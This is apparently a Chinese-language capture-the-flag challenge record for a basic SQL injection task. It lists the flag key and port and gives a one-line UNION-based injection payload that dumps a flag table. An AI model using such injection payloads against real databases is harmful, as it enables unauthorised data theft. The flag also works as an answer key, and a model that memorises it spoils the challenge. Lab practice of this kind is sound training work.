# 题目：最最最简单的sql注入

### 题目描述：无

### 题目难度： 🌟

### 维护：SiJiDo

### KEY: `NSCTF{f6c631f294a64dbb1e963f427fdc725d}`

### 配置信息： 

1. 开放端口： `10002`

### 解题过程：

1. 联合注入即可

   `-1' union select (select group_concat(flag) from flag),2,3,4 #`